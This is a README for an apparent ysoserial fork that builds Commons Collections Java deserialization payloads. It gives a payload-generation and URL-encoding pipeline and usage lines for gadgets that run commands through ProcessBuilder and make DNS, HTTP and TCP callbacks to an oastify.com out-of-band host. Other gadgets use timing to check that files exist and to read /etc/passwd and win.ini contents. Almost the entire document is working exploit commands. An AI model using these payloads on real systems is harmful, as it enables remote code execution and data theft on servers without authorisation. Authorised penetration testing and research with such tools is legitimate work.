# CommonsCollections Payloads

## Compilation

```
mvn clean package -DskipTests
```

## Payload generation, compression and encoding

```
java -jar target/ysoserial-all.jar CommonsCollectionsX <args> | gzip | base64 -w 0 | sed -e 's/\+/%2B/g' -e 's/\//%2F/g' -e 's/\=/%3D/g'; echo
```

## Usage

### CommonsCollectionsDnsRequest

```
CommonsCollectionsDnsRequest "abcdefghijklmnopqrstuvwxyz123456.oastify.com"
```

### CommonsCollectionsGetURL

```
CommonsCollectionsGetURL "https://abcdefghijklmnopqrstuvwxyz123456.oastify.com"
```

### CommonsCollectionsIfFileExistsSleep7s

```
CommonsCollectionsIfFileExistsSleep7s "/etc/passwd"
CommonsCollectionsIfFileExistsSleep7s "c:\\windows\\win.ini"
```

### CommonsCollectionsProcessBuilder

```
CommonsCollectionsProcessBuilder "nslookup abcdefghijklmnopqrstuvwxyz123456.oastify.com"
```

### CommonsCollectionsReadFileIfStartsWithSleep7s

```
CommonsCollectionsReadFileIfStartsWithSleep7s "/etc/passwd" "cm9vdA=="
CommonsCollectionsReadFileIfStartsWithSleep7s "c:\\windows\\win.ini" "OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0"
```

### CommonsCollectionsSleepSeconds

```
CommonsCollectionsSleepSeconds 7000
```

### CommonsCollectionsTcpConnection

```
CommonsCollectionsTcpConnection "abcdefghijklmnopqrstuvwxyz123456.oastify.com" 443
```

## References

- https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html
- https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html
- https://github.com/frohoff/ysoserial
